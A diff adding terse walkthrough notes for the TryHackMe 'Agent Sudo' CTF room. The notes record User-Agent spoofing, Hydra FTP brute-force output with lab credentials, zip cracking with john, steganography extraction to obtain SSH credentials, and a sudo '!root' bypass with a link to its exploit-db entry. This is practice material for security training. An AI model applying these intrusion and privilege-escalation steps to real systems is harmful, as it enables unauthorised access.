@@ -1,0 +1,42 @@
+https://tryhackme.com/room/agentsudoctf
+BurpSuite
+Setting User-Agent: C I get a 302 (redirect) to another page
+
+
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R 
+
+[DATA] attacking ftp://10.10.12.65:21/                                                                   │2024-02-05 14:49:04 net_iface_up: set tun0 up
+[21][ftp] host: 10.10.12.65   login: chris   password: crystal  
+
+ftp
+mget *
+Read txt file
+strings cutie.png
+binwalk cutie.png
+binwalk -e cutie.png to extract
+Using zip2john on the zip file dumping to a file (https://medium.com/@ujjawal.soni2002/cracking-a-password-protected-zip-file-using-john-the-ripper-f39e657cbfa8)
+zip2john your_file.zip > zip.hash
+john zip.hash to hash it
+Found password alien
+alien            (8702.zip/To_agentR.txt)
+7z e 8702.zip
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+Decode here: https://www.base64decode.org/
+Area51
+steghide extract -sf cute-alien.jpg
+Password: Area51
+Your login password is hackerrules!
+
+SSH as james:hackerrules!
+reverse search the image on google: https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment
+sudo -l
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+exploit: https://www.exploit-db.com/exploits/47502
